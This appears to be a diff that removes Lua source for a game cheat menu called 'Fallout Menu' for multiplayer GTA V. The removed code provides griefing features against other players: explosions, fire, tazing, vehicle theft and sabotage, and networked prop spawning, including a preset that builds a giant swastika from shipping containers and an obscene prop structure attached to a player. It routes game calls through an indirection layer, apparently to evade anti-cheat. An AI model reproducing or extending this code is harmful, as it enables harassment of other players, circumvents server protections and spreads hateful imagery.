-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["R"]) then
-                FM:GetFunction("ClearPedTasks")(beginning_target)
-                FM:GetFunction("ClearPedSecondaryTask")(beginning_target)
-                FM:AddNotification("SUCCESS", "Cleared tasks for ~y~" .. beginning_target)
-                beginning_target = nil
-            end
-        end
-
-        if FM:GetFunction("DoesEntityExist")(entity) and FM:GetFunction("DoesEntityHaveDrawable")(entity) and not FM:GetFunction("IsEntityAnObject")(entity) then
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not beginning_target then
-                if FM:GetFunction("IsEntityAVehicle")(entity) then
-                    entity = FM:GetFunction("GetPedInVehicleSeat")(entity, -1)
-                end
-
-                beginning_target = entity
-            end
-
-            if beginning_target ~= entity then
-                self:DrawBoundingBox(entity, 0, 122, 200, 50)
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and FM:GetFunction("DoesEntityExist")(beginning_target) then
-                    self:Attack(beginning_target, entity)
-                    beginning_target = nil
-                end
-            end
-        end
-    end
-
-    local selected_spawner_opt = 1
-    local selected_weapon_opt = 1
-    local asking_weapon
-    local selected_ped
-    local selected_weapon
-
-    FM.FreeCam.SpawnerOptions = {
-        ["PED"] = {"s_f_y_bartender_01", "a_m_y_beachvesp_01", "a_m_y_beach_03", "a_m_y_beach_02", "a_m_m_beach_02", "a_m_y_beach_01", "s_m_y_baywatch_01", "mp_f_boatstaff_01", "u_m_m_bikehire_01", "a_f_y_bevhills_04", "s_m_m_bouncer_01", "s_m_y_armymech_01", "s_m_y_autopsy_01", "s_m_y_blackops_01", "s_m_y_blackops_02"},
-        ["WEAPONS"] = all_weapons,
-        ["OBJECT"] = {"a_c_cat_01", "prop_mp_spike_01", "prop_tyre_spike_01", "prop_container_ld2", "lts_prop_lts_ramp_03", "prop_jetski_ramp_01", "prop_mp_ramp_03_tu", "prop_skate_flatramp_cr", "stt_prop_ramp_adj_loop", "stt_prop_ramp_multi_loop_rb", "stt_prop_ramp_spiral_l", "stt_prop_ramp_spiral_l_m", "prop_const_fence03b_cr", "prop_const_fence02b", "prop_const_fence03a_cr", "prop_fnc_farm_01e", "prop_fnccorgm_02c", "ch3_01_dino", "p_pallet_02a_s", "prop_conc_blocks01a", "hei_prop_cash_crate_half_full", "prop_consign_01a", "prop_byard_net02", "prop_mb_cargo_04b", "prop_mb_crate_01a_set", "prop_pipe_stack_01", "prop_roadcone01c", "prop_rub_cage01b", "prop_sign_road_01a", "prop_sign_road_03m", "prop_traffic_rail_2", "prop_traffic_rail_1a", "prop_traffic_03a", "prop_traffic_01d", "prop_skid_trolley_1", "hei_prop_yah_seat_03", "hei_prop_yah_table_03", "lts_prop_lts_elecbox_24", "lts_prop_lts_elecbox_24b", "p_airdancer_01_s", "p_amb_brolly_01", "p_amb_brolly_01_s", "p_dumpster_t", "p_ld_coffee_vend_01", "p_patio_lounger1_s", "p_yacht_sofa_01_s", "prop_air_bagloader2_cr", "prop_air_bigradar", "prop_air_blastfence_01", "prop_air_stair_01", "prop_air_sechut_01", "prop_airport_sale_sign"},
-        ["VEHICLE"] = car_spam,
-        ["PREMADE"] = {
-            ["SWASTIKA"] = function(ent, offZ)
-                if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-                CreateThread(function()
-                    local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
-
-                    if not FM:GetFunction("IsEntityAPed")(ent) then
-                        where = vector3(where.x, where.y, where.z + 5.0)
-                    end
-
-                    if offZ then
-                        where = vector3(where.x, where.y, where.z + offZ)
-                    end
-
-                    local column = {
-                        ["up"] = {},
-                        ["across"] = {}
-                    }
-
-                    for i = 0, 7 do
-                        column["up"][i + 1] = {
-                            x = 0.0,
-                            y = 0.0,
-                            z = 1.0 + (2.6 * (i + 1)),
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-                    end
-
-                    for i = 0, 8 do
-                        column["across"][i + 1] = {
-                            x = 10.4 + (-2.6 * i),
-                            y = 0.0,
-                            z = 11.6,
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-                    end
-
-                    local arms = {
-                        ["bottom_right"] = {},
-                        ["across_up"] = {},
-                        ["top_left"] = {},
-                        ["across_down"] = {}
-                    }
-
-                    for i = 0, 4 do
-                        arms["bottom_right"][i] = {
-                            x = -2.6 * i,
-                            y = 0.0,
-                            z = 1.0,
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-
-                        arms["top_left"][i] = {
-                            x = 2.6 * i,
-                            y = 0.0,
-                            z = 22.2,
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-
-                        arms["across_down"][i + 1] = {
-                            x = 10.4,
-                            y = 0.0,
-                            z = 12.6 - (2.25 * (i + 1)),
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-                    end
-
-                    for i = 0, 3 do
-                        arms["across_up"][i + 1] = {
-                            x = -10.4,
-                            y = 0.0,
-                            z = 11.6 + (2.6 * (i + 1)),
-                            _p = 90.0,
-                            _y = 0.0,
-                            _r = 0.0
-                        }
-                    end
-
-                    local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}
-                    FM:RequestModelSync("prop_container_05a")
-
-                    for _, seg in dict.pairs(positions) do
-                        for k, v in dict.pairs(seg) do
-                            local obj = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)
-                            FM:DoNetwork(obj)
-                            FM:GetFunction("AttachEntityToEntity")(obj, ent, FM:GetFunction("IsEntityAPed")(ent) and FM:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)
-                            Wait(80)
-                        end
-                    end
-                end)
-            end,
-            ["DICK"] = function(ent)
-                if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-                CreateThread(function()
-                    local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
-
-                    if not FM:GetFunction("IsEntityAPed")(ent) then
-                        where = vector3(where.x, where.y, where.z + 5.0)
-                    end
-
-                    FM:RequestModelSync("stt_prop_stunt_bowling_ball")
-                    local ball_l = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
-                    FM:DoNetwork(ball_l)
-                    FM:GetFunction("AttachEntityToEntity")(ball_l, ent, FM:GetFunction("IsEntityAPed")(ent) and FM:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
-                    Wait(50)
-                    local ball_r = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
-                    FM:DoNetwork(ball_r)
-                    FM:GetFunction("AttachEntityToEntity")(ball_r, ent, FM:GetFunction("IsEntityAPed")(ent) and FM:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
-                    Wait(50)
-                    local shaft = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("prop_container_ld2"), where.x, where.y, where.z, true, true, true)
-                    FM:DoNetwork(shaft)
-                    FM:GetFunction("AttachEntityToEntity")(shaft, ent, FM:GetFunction("IsEntityAPed")(ent) and FM:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
-                    Wait(50)
-                end)
-            end
-        }
-    }
-
-    local preview_object
-    local preview_object_model
-    local premade_options = {}
-    local funcs = {}
-
-    for name, func in dict.pairs(FM.FreeCam.SpawnerOptions["PREMADE"]) do
-        table.insert(premade_options, name)
-        table.insert(funcs, func)
-    end
-
-    function FM.FreeCam:DeletePreview()
-        if preview_object and FM:GetFunction("DoesEntityExist")(preview_object) then
-            FM.Util:DeleteEntity(preview_object)
-            preview_object = nil
-        end
-
-        preview_object = nil
-        preview_object_model = nil
-    end
-
-    local bad_models = {}
-    local _loading
-    local notif_alpha = 0
-    local doing_alpha
-    local last_alpha
-    local cur_notifs
-    local offX = 0
-
-    function FM.FreeCam:Spawner(where, heading, type)
-        local name, options
-        local cam_rot = FM:GetFunction("GetCamRot")(self.Cam, 0)
-        if self.DraggingEntity and FM:GetFunction("DoesEntityExist")(self.DraggingEntity) then return self:DeletePreview() end
-
-        if type == "PED" then
-            options = self.SpawnerOptions["PED"]
-
-            if selected_spawner_opt > #options then
-                selected_spawner_opt = 1
-            end
-
-            if preview_object then
-                self:DeletePreview()
-            end
-
-            name = "Ped List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
-            FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTCTRL"], 0), "Invisibility"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTSHIFT"], 0), "God Mode"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["E"], 0), "Clone"}})
-        elseif type == "OBJECT" then
-            asking_weapon = false
-            selected_weapon_opt = 1
-            options = self.SpawnerOptions["OBJECT"]
-
-            if selected_spawner_opt > #options then
-                selected_spawner_opt = 1
-            end
-
-            local cur_model = options[selected_spawner_opt]
-
-            if preview_object_model ~= cur_model and not _loading then
-                _loading = true
-
-                CreateThread(function()
-                    if not FM:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then
-                        _loading = false
-                        self:DeletePreview()
-                        bad_models[cur_model] = true
-
-                        return FM:AddNotification("ERORR", "Failed to load model ~r~" .. cur_model, 5000)
-                    end
-
-                    if bad_models[cur_model] then
-                        _loading = false
-                        self:DeletePreview()
-
-                        return
-                    end
-
-                    if FM:GetFunction("HasModelLoaded")(cur_model) then
-                        _loading = false
-                        self:DeletePreview()
-                        preview_object = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z + 0.5, false, true, true)
-                        FM:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
-                        FM:GetFunction("SetEntityAlpha")(preview_object, 100)
-                        FM:GetFunction("FreezeEntityPosition")(preview_object, true)
-                        FM:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
-                        FM:GetFunction("SetEntityCollision")(preview_object, false, false)
-                        preview_object_model = cur_model
-                    end
-                end)
-            end
-
-            if preview_object and FM:GetFunction("DoesEntityExist")(preview_object) then
-                FM:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
-                FM:GetFunction("SetEntityAlpha")(preview_object, 100)
-                FM:GetFunction("FreezeEntityPosition")(preview_object, true)
-                FM:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
-                FM:GetFunction("SetEntityCollision")(preview_object, false, false)
-            end
-
-            name = "Object List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
-            FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTCTRL"], 0), "Attach (Hovered)"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["E"], 0), "Clone"}})
-        elseif type == "PREMADE" then
-            asking_weapon = false
-            selected_weapon_opt = 1
-            options = premade_options
-
-            if selected_spawner_opt > #options then
-                selected_spawner_opt = 1
-            end
-
-            if preview_object then
-                self:DeletePreview()
-            end
-
-            name = "Premade List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
-        elseif type == "VEHICLE" then
-            asking_weapon = false
-            selected_weapon_opt = 1
-            options = self.SpawnerOptions["VEHICLE"]
-
-            if selected_spawner_opt > #options then
-                selected_spawner_opt = 1
-            end
-
-            if preview_object then
-                self:DeletePreview()
-            end
-
-            name = "Vehicle List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
-        end
-
-        if asking_weapon then
-            options = self.SpawnerOptions["WEAPONS"]
-            name = "Weapon List (" .. selected_weapon_opt .. "/" .. #options .. ")"
-        end
-
-        FM.Painter:DrawText("~w~[~y~Fallout Menu~w~] " .. (name or "?"), 4, false, FM:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
-        local sY = 30
-        local max_opts = 30
-        local cur_opt = (asking_weapon and selected_weapon_opt or selected_spawner_opt)
-        local count = 0
-        local total_opts = (#options or {})
-        local can_see = true
-
-        for id, val in dict.pairs(options or {}) do
-            if total_opts > max_opts then
-                can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
-            else
-                count = 0
-            end
-
-            if can_see and count <= 10 then
-                local r, g, b = 255, 255, 255
-
-                if (asking_weapon and selected_weapon_opt or selected_spawner_opt) == id then
-                    r, g, b = FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3]
-                end
-
-                FM.Painter:DrawText(val, 4, false, FM:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
-                sY = sY + 20
-                count = count + 1
-            end
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["DOWN"]) and not FM.Showing then
-            if asking_weapon then
-                local new = selected_weapon_opt + 1
-
-                if options[new] then
-                    selected_weapon_opt = new
-                else
-                    selected_weapon_opt = 1
-                end
-            else
-                local new = selected_spawner_opt + 1
-
-                if options[new] then
-                    selected_spawner_opt = new
-                else
-                    selected_spawner_opt = 1
-                end
-            end
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["UP"]) and not FM.Showing then
-            if asking_weapon then
-                local new = selected_weapon_opt - 1
-
-                if options[new] then
-                    selected_weapon_opt = new
-                else
-                    selected_weapon_opt = #options
-                end
-            else
-                local new = selected_spawner_opt - 1
-
-                if options[new] then
-                    selected_spawner_opt = new
-                else
-                    selected_spawner_opt = #options
-                end
-            end
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["ENTER"]) and not FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["SPACE"]) and not FM.Showing then
-            if type == "PED" then
-                if not asking_weapon then
-                    selected_ped = options[selected_spawner_opt]
-                    asking_weapon = true
-                else
-                    selected_weapon = options[selected_weapon_opt]
-                    local ped = FM:SpawnPed(where, heading, selected_ped, selected_weapon)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        SetEntityInvincible(ped, true)
-                    end
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTCTRL"]) then
-                        FM:GetFunction("SetEntityVisible")(ped, false)
-                    end
-
-                    FM:AddNotification("SUCCESS", "Spawned ped.", 5000)
-                end
-            elseif type == "OBJECT" then
-                local object = options[selected_spawner_opt]
-                FM:RequestModelSync(object)
-                local obj = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
-                FM:DoNetwork(obj)
-                FM:GetFunction("SetEntityRotation")(obj, 0.0, 0.0, cam_rot.z + 0.0)
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTCTRL"]) and FM:GetFunction("DoesEntityExist")(self.HoveredEntity) then
-                    FM:GetFunction("AttachEntityToEntity")(obj, self.HoveredEntity, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
-                end
-
-                Wait(50)
-            elseif type == "PREMADE" then
-                local func = funcs[selected_spawner_opt]
-                func(self.HoveredEntity)
-            elseif type == "VEHICLE" then
-                local model = options[selected_spawner_opt]
-                FM:RequestModelSync(model)
-                local veh = FM:GetFunction("CreateVehicle")(FM:GetFunction("GetHashKey")(model), where.x, where.y, where.z, 0.0, true, true)
-                FM:DoNetwork(veh)
-            end
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["BACKSPACE"]) and not FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE2"]) and asking_weapon and not FM.Showing then
-            asking_weapon = false
-            selected_weapon_opt = 1
-        end
-
-        FM.Painter:DrawRect(FM:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
-        FM.Painter:DrawRect(FM:ScrW() - 360 - 21 - offX, 49, 360, 2, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-    end
-
-    local rotP, rotY, rotR
-    local dist = {0, 45, 90, 135, 180, -45, -90, -135, -180}
-    local smallest, index = dict.math.huge, 0
-
-    local function _snap(rot)
-        for _, val in dict.pairs(dist) do
-            local diff = dict.math.abs(val - rot)
-
-            if diff <= smallest then
-                smallest = diff
-                index = _
-            end
-        end
-
-        return dist[index] or rot
-    end
-
-    function FM:KickOutAllPassengers(ent, specific)
-        for i = -1, FM:GetFunction("GetVehicleMaxNumberOfPassengers")(ent) - 1 do
-            if not FM:GetFunction("IsVehicleSeatFree")(ent, i) and (not specific or specific == i) then
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("GetPedInVehicleSeat")(ent, i))
-                FM:GetFunction("ClearPedSecondaryTask")(FM:GetFunction("GetPedInVehicleSeat")(ent, i))
-                FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPedInVehicleSeat")(ent, i))
-            end
-        end
-    end
-
-    local _stealing
-    local _stealing_ped
-
-    function FM.FreeCam:DoSteal(ent)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTSHIFT"], 0), "Invisible"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTALT"], 0), "Fuck Up Speed"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["R"], 0), "Kick Out Driver"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE2"], 0), "Steal (NPC)"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Steal (Self)"}, {"b_117", "Change Mode"}})
-        if not self:CheckType(ent, "VEHICLE") then return end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE2"]) then
-            CreateThread(function()
-                _stealing = ent
-                local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-
-                if not FM:RequestModelSync(model) then
-                    _stealing = nil
-
-                    return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                end
-
-                local c = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
-                local x, y, z = c.x, c.y, c.z
-                local out, pos = FM:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
-
-                if not out then
-                    pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
-                end
-
-                local random_npc = FM:GetFunction("CreatePed")(24, FM:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
-                _stealing_ped = random_npc
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                    FM:GetFunction("SetEntityVisible")(random_npc, false)
-                end
-
-                FM:GetFunction("SetPedAlertness")(random_npc, 0.0)
-                local success = FM:StealVehicleThread(random_npc, _stealing)
-                FM:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
-                local timeout = 0
-
-                if not success then
-                    _stealing = nil
-                    _stealing_ped = nil
-
-                    return
-                end
-
-                while FM:GetFunction("DoesEntityExist")(_stealing) and FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not FM:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
-                    timeout = timeout + 10
-                    Wait(100)
-                end
-
-                if FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
-                    _stealing = nil
-
-                    return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                end
-
-                _stealing_ped = nil
-                _stealing = nil
-            end)
-        elseif FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) then
-            CreateThread(function()
-                _stealing = ent
-                FM:KickOutAllPassengers(ent)
-                FM:GetFunction("TaskWarpPedIntoVehicle")(FM:GetFunction("PlayerPedId")(), ent, -1)
-                _stealing_ped = nil
-                _stealing = nil
-            end)
-        elseif FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["R"]) then
-            CreateThread(function()
-                _stealing = ent
-                local driver = FM:GetFunction("GetPedInVehicleSeat")(ent, -1)
-                FM:KickOutAllPassengers(ent, -1)
-                FM:GetFunction("TaskWanderStandard")(driver)
-                _stealing_ped = nil
-                _stealing = nil
-            end)
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["LEFTALT"]) then
-            CreateThread(function()
-                FM:GetFunction("NetworkRequestControlOfEntity")(ent)
-
-                if FM:GetFunction("NetworkHasControlOfEntity")(ent) then
-                    FM:GetFunction("ModifyVehicleTopSpeed")(ent, 250000.0)
-
-                    return FM:AddNotification("SUCCESS", "Speed fucked!")
-                end
-            end)
-        end
-
-        self:DrawBoundingBox(ent, 122, 177, 220, 50)
-        self:DrawInfoCard(ent)
-    end
-
-    function FM.FreeCam:DoTaze(ent, endCoords)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Taze"}, {"b_117", "Change Mode"}})
-
-        if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-            self:DrawBoundingBox(ent, 50, 122, 200, 50)
-        end
-
-        if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-            if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-                FM:TazePlayer(ent)
-            else
-                FM:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, endCoords.x, endCoords.y, endCoords.z, 1, true, FM:GetFunction("GetHashKey")("WEAPON_STUNGUN"), FM:GetFunction("PlayerPedId")(), true, false, 24000.0)
-            end
-        end
-    end
-
-    function FM.FreeCam:DoHydrant(ent, endCoords)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Hydrant"}, {"b_117", "Change Mode"}})
-
-        if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-            self:DrawBoundingBox(ent, 50, 122, 200, 50)
-        end
-
-        if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-            if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-                FM:HydrantPlayer(ent)
-            else
-                FM:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 13, 100.0, false, false, 0.0)
-            end
-        end
-    end
-
-    function FM.FreeCam:DoFire(ent, endCoords)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Fire"}, {"b_117", "Change Mode"}})
-
-        if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-            self:DrawBoundingBox(ent, 50, 122, 200, 50)
-        end
-
-        if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-            if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-                FM:FirePlayer(ent)
-            else
-                FM:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 12, 100.0, false, false, 0.0)
-            end
-        end
-    end
-
-    function FM.FreeCam:DoExplosion(ent, endCoords)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Explode"}, {"b_117", "Change Mode"}})
-
-        if FM:GetFunction("DoesEntityExist")(ent) and (_is_ped_player(ent) or FM:GetFunction("IsEntityAVehicle")(ent)) then
-            self:DrawBoundingBox(ent, 50, 122, 200, 50)
-        end
-
-        if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-            if FM:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
-                FM:GetFunction("AddExplosion")(FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
-            elseif FM:GetFunction("DoesEntityExist")(ent) and FM:GetFunction("IsEntityAVehicle")(ent) then
-                FM:GetFunction("NetworkExplodeVehicle")(ent, true, false, false)
-            else
-                FM:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 7, 100000.0, true, false, 0.0)
-            end
-        end
-    end
-
-    local preview_spike_strip
-    local spike_model = "p_ld_stinger_s"
-
-    function FM.FreeCam:DoSpikeStrips(ent, endCoords)
-        if not preview_spike_strip then
-            preview_spike_strip = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.1, false, true, true)
-        end
-
-        local rot = FM:GetFunction("GetCamRot")(self.Cam, 0)
-        FM:GetFunction("SetEntityCoords")(preview_spike_strip, endCoords.x, endCoords.y, endCoords.z + 0.1)
-        FM:GetFunction("SetEntityAlpha")(preview_spike_strip, 100)
-        FM:GetFunction("FreezeEntityPosition")(preview_spike_strip, true)
-        FM:GetFunction("SetEntityRotation")(preview_spike_strip, 0.0, 0.0, rot.z + 0.0)
-        FM:GetFunction("SetEntityCollision")(preview_spike_strip, false, false)
-
-        if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-            rot = FM:GetFunction("GetEntityRotation")(preview_spike_strip)
-            local spike_strip = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z - 0.2, true, true, true)
-            FM:DoNetwork(spike_strip)
-            FM:GetFunction("SetEntityRotation")(spike_strip, rot)
-            FM:GetFunction("FreezeEntityPosition")(spike_strip, true)
-        end
-    end
-
-    function FM.FreeCam:DoDisable(ent, endCoords)
-        if FM:GetFunction("IsEntityAVehicle")(ent) then
-            if IsDisabledControlJustPressed(0, FM.Keys["MOUSE1"]) then
-                FM:DisableVehicle(ent)
-            end
-
-            self:DrawBoundingBox(ent, 50, 122, 200, 50)
-        end
-    end
-
-    local _stealing
-    local _stealing_ped
-
-    function FM.FreeCam:DoRCCar(ent, endCoords)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTSHIFT"], 0), "Invisible"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["X"], 0), "Spawn (NPC)"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["R"], 0), "Release Car (If Active)"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE2"], 0), "Steal (NPC)"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Steal (Force)"}, {"b_117", "Change Mode"}})
-
-        if _stealing then
-            self:DrawBoundingBox(_stealing_ped, 255, 122, 184, 50)
-
-            return self:DrawBoundingBox(_stealing, 255, 120, 255, 50)
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["R"]) and FM.RCCar.On then
-            FM:AddNotification("INFO", "Released RC Car!")
-            _stealing = nil
-            _stealing_ped = nil
-
-            return FM:DoRCCar(false)
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE2"]) and self:CheckType(ent, "VEHICLE") then
-            CreateThread(function()
-                _stealing = ent
-                local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-
-                if not FM:RequestModelSync(model) then
-                    _stealing = nil
-
-                    return FM:AddNotification("Failed to steal vehicle!")
-                end
-
-                local c = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
-                local x, y, z = c.x, c.y, c.z
-                local out, pos = FM:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
-
-                if not out then
-                    pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
-                end
-
-                local random_npc = FM:GetFunction("CreatePed")(24, FM:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
-                _stealing_ped = random_npc
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                    FM:GetFunction("SetEntityVisible")(random_npc, false)
-                end
-
-                FM:GetFunction("SetPedAlertness")(random_npc, 0.0)
-                local success = FM:StealVehicleThread(random_npc, _stealing, true)
-                FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
-                FM:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
-                local timeout = 0
-
-                if not success then
-                    _stealing = nil
-                    _stealing_ped = nil
-
-                    return
-                end
-
-                while FM:GetFunction("DoesEntityExist")(_stealing) and FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not FM:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
-                    timeout = timeout + 10
-                    Wait(100)
